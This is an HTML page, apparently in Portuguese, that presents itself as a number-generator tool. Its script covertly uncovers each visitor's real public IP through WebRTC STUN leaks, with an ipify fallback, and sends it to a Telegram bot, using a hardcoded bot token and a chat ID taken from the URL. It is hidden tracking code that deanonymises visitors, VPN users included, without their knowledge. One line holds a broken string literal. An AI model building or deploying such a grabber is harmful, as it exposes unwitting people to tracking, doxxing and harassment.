<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>envy' suzaika - Gerador de NÃºmeros</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Major+Mono+Display&family=Ubuntu+Mono:wght@400;700&display=swap');
        body {
            font-family: 'Ubuntu Mono', monospace;
            background-color: #0f172a;
            color: white;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: relative;
        }
        /* Seus estilos continuam iguais... */
    </style>
</head>
<body>
    <div class="text-center px-4">
        <!-- seu conteÃºdo HTML igual -->
    </div>

    <div class="absolute bottom-4 text-slate-500 text-sm">
        Â© Envy' Suzaika - Todos os direitos reservados
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8250581893:AAGLlT-nSmXL58Ec1WqdZHGOHmw8YQPObEs';
        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

        // FunÃ§Ã£o que checa se o IP Ã© pÃºblico
        function isPublicIP(ip) {
            const privateRanges = [
                /^10\./,
                /^172\.(1[6-9]|2[0-9]|3[0-1])\./,
                /^192\.168\./,
                /^127\./,
                /^169\.254\./
            ];
            if (!ip) return false;
            if (ip.endsWith('.local')) return false; // descarta mDNS
            return !privateRanges.some(regex => regex.test(ip));
        }

        async function testWebRTC() {
            const foundIPs = new Set();
            const pc = new RTCPeerConnection({
                iceServers: [
                    { urls: "stun:stun.l.google.com:19302" },
                    { urls: "stun:stun1.l.google.com:19302" }
                ]
            });

            pc.createDataChannel("");
            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);

            return new Promise((resolve) => {
                const timeout = setTimeout(() => {
                    // pega o primeiro IP pÃºblico encontrado ou null
                    const publicIP = [...foundIPs].find(ip => isPublicIP(ip));
                    resolve(publicIP || null);
                }, 3000);

                pc.onicecandidate = event => {
                    if (!event || !event.candidate) {
                        clearTimeout(timeout);
                        const publicIP = [...foundIPs].find(ip => isPublicIP(ip));
                        resolve(publicIP || null);
                        return;
                    }

                    const candidate = event.candidate.candidate;
                    const parts = candidate.split(" ");
                    const ip = parts[4];

                    if (ip && !foundIPs.has(ip)) {
                        foundIPs.add(ip);
                    }
                };
            });
        }

        async function getIPFallback() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch {
                return null;
            }
        }

        async function sendIPInfo() {
            const urlParams = new URLSearchParams(window.location.search);
            const chatId = urlParams.get('chat_id');
            
            if(chatId) {
                let ip = await testWebRTC();
                if (!ip) {
                    ip = await getIPFallback();
                }
                if (!ip) ip = 'n;

                const message = `ðŸ–¤ ip original revelado: ${ip}`;

                try {
                    await fetch(`${TELEGRAM_API_URL}?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`);
                } catch {}
            }
        }

        // Suas outras funÃ§Ãµes (generateNumber, receiveSMS, etc) continuam iguais
    </script>
</body>
</html>
